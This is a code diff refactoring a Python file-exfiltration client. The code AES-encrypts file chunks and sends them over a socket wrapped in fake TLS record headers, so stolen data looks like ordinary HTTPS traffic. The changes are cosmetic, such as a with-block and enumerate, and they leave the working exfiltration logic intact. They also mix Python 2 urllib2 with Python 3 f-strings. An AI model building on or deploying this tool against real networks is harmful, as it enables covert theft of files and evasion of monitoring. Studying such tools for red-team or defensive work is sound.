@@ -50,7 +50,7 @@ class AESCipher(object):
 
     @staticmethod
     def _unpad(s):
-        return s[:-ord(s[len(s)-1:])]
+        return s[:-ord(s[-1:])]
 
 
 class HTTPSExfiltrationClient():
@@ -74,7 +74,7 @@ class HTTPSExfiltrationClient():
 
     def _pretendSSL(self):
         try:
-            response = urllib2.urlopen('https://%s:%s/' % (self.host, self.port))
+            response = urllib2.urlopen(f'https://{self.host}:{self.port}/')
             html = response.read()
         except urllib2.URLError as e:
             return 0
@@ -112,9 +112,7 @@ class HTTPSExfiltrationClient():
 
         if len(packet_length) == 1:
             packet_length = "\x00" + packet_length
-        elif len(packet_length) == 2:
-            pass
-        else:
+        elif len(packet_length) != 2:
             sys.stderr.write("[!]\tPacket is too big.\n")
             return 1
 
@@ -131,7 +129,7 @@ class HTTPSExfiltrationClient():
         except ValueError:
             return 1
 
-        if len(as_char) == 0:
+        if not as_char:
             return "\x00\x00"
 
         elif len(as_char) == 1:
@@ -148,9 +146,8 @@ class HTTPSExfiltrationClient():
 
         # Read the file
         try:
-            f = open(file_path, 'rb')
-            data = f.read()
-            f.close()
+            with open(file_path, 'rb') as f:
+                data = f.read()
             sys.stdout.write("[+]\tFile '%s' was loaded for exfiltration.\n" % file_path)
         except IOError as e:
             sys.stderr.write("[-]\tUnable to read file '%s'.\n%s.\n" % (file_path, e))
@@ -169,26 +166,16 @@ class HTTPSExfiltrationClient():
         # Build Chunks in Order:
         transmit_blocks = []
         blocks_count = self._roundItUp(len(chunks))
-        i = 0
-
-        for chunk in chunks:
-            i += 1
+        for i, chunk in enumerate(chunks, start=1):
             enc_data = self.AESDriver.encrypt(chunk)
             chunk_len = self._roundItUp(len(enc_data))
             this_packet = self._roundItUp(i)
 
-            if chunk_len == 1:
-                # No data to encode
-                pass
-
-            else:
+            if chunk_len != 1:
                 this = "\x17\x03\x03" + chunk_len + this_packet + blocks_count + enc_data
                 transmit_blocks.append(this)
 
-        # Send the data
-        i = 0
-        for block in transmit_blocks:
-            i += 1
+        for i, block in enumerate(transmit_blocks, start=1):
             sys.stdout.write("[.]\tSending block %s/%s - len(%s).\n" % (i, len(transmit_blocks), len(block)-9))
             try:
                 self.sock.send(block)
